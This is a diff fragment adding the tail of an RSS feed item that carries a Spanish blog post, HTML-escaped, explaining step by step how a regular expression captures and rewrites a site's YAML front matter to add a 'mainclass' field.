+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;categories:
+  -
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;([a-zA-Z ]+)&lt;/code&gt;: nos captura la primera categoría especificada, junto a la expresión anterior, tenemos:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;categories:
+  - Articulos
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;(\s+-[a-zA-Z ]*)?&lt;/code&gt; captura el resto de categorías restantes, por lo que ahora tenemos:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;categories:
+  - Articulos
+  - Android
+  - Java
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;(.*?)-{3}&lt;/code&gt; por último capturamos el resto de texto que queda hasta encontrar el fin del &lt;em&gt;Front Matter&lt;/em&gt;, los &lt;code&gt;---&lt;/code&gt;. Así que esta expresión nos ha capturado lo siguiente:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;categories:
+  - Articulos
+  - Android
+  - Java
+param5: valor5
+param6: valor6
+param7: valor7
+param8: valor8
+---
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ahora queda reescribirla, de eso se ocupa la segunda parte, &lt;code&gt;$1$2$3$4mainclass: &amp;quot;$2&amp;quot;\n---&lt;/code&gt;. Cada uno de los grupos que hemos capturado anteriormente quedan almacenados para poder usarse luego, se referencian con un $ y un número, el primer grupo tiene asociado el número 1, y por tanto se le referencia con &lt;code&gt;$1&lt;/code&gt;. De este modo, &lt;code&gt;$1$2$3$4mainclass: &amp;quot;$2&amp;quot;\n---&lt;/code&gt; nos dejará el fichero tal y como estaba, pero añadiéndole al final otro parámetro:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;---
+param1: valor1
+param2: valor2
+param3: valor3
+param4: valor4
+categories:
+  - Articulos
+  - Android
+  - Java
+param5: valor5
+param6: valor6
+param7: valor7
+param8: valor8
+mainclass: &amp;quot;articulos&amp;quot;
+color: &amp;quot;#F57C00&amp;quot;
+---
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;referencias&#34;&gt;Referencias&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;How do I replace multiple lines with single word in file(inplace replace)? | &lt;a href=&#34;http://askubuntu.com/questions/533221/how-do-i-replace-multiple-lines-with-single-word-in-fileinplace-replace&#34; title=&#34;How do I replace multiple lines with single word in file(inplace replace)?&#34;&gt;askubuntu.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+        </item>
+        
+    </channel>
+</rss>
